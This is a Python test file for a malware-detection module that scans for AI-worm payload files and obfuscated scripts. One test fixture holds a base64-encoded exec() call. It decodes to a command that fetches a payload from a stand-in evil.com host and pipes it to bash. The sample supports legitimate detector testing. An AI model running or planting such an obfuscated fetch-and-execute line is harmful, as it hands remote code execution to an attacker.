import sys
import os
import hashlib
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_filesystem")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_filesystem"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.MODERATE
    assert Platform.DARWIN in mod.platforms
    assert Platform.LINUX in mod.platforms
    assert Platform.WIN32 in mod.platforms


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_known_payload_path():
    """When a file exists at a known IOC path, flag it as critical/high-confidence."""
    mod = _get_module()

    def mock_exists(self):
        return str(self).endswith("index.js") and ".config" in str(self)

    def mock_is_file(self):
        return mock_exists(self)

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", mock_exists):
            with patch.object(Path, "is_file", mock_is_file):
                with patch.object(Path, "expanduser", lambda self: self):
                    result = mod.check(_make_profile())

    payload_findings = [
        f for f in result.findings if f.data.get("check") == "known_payload_path"
    ]
    assert len(payload_findings) > 0
    assert payload_findings[0].severity == Severity.CRITICAL
    assert payload_findings[0].data["confidence"] == "high"


def test_detects_obfuscated_script():
    """Detect scripts with suspicious eval/exec + base64 patterns."""
    mod = _get_module()

    suspicious_content = """
import base64
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkIHwgYmFzaCIp'))
"""

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                # Mock the heuristic scanning to find our suspicious file
                with patch.object(
                    mod,
                    "_scan_for_obfuscated_scripts",
                    return_value=[
                        {
                            "path": "/tmp/evil.py",
                            "pattern": "exec(base64.b64decode(",
                        }
                    ],
                ):
                    result = mod.check(_make_profile())

    obfuscated = [
        f for f in result.findings if f.data.get("check") == "obfuscated_script"
    ]
    assert len(obfuscated) > 0
    assert obfuscated[0].data["confidence"] == "medium"


def test_fix_only_acts_on_high_confidence():
    """fix() should skip findings with confidence != high."""
    mod = _get_module()

    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_filesystem",
        findings=[
            Finding(
                title="Known payload",
                description="Found payload",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "known_payload_path",
                    "confidence": "high",
                    "path": "/tmp/evil.js",
                },
            ),
            Finding(
                title="Suspicious script",
                description="Obfuscated",
                severity=Severity.WARNING,
                category="security",
                data={
                    "check": "obfuscated_script",
                    "confidence": "medium",
                    "path": "/tmp/maybe.py",
                },
            ),
        ],
    )

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        with patch("shutil.move"):
            fix = mod.fix(check, Mode.MANUAL)

    # Only the high-confidence finding should get an action
    remediation_actions = [a for a in fix.actions if "quarantine" in a.title.lower()]
    info_actions = [a for a in fix.actions if "investigate" in a.title.lower()]
    assert len(remediation_actions) <= 1
    assert len(info_actions) >= 1


def test_subprocess_timeout_handled():
    mod = _get_module()

    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues
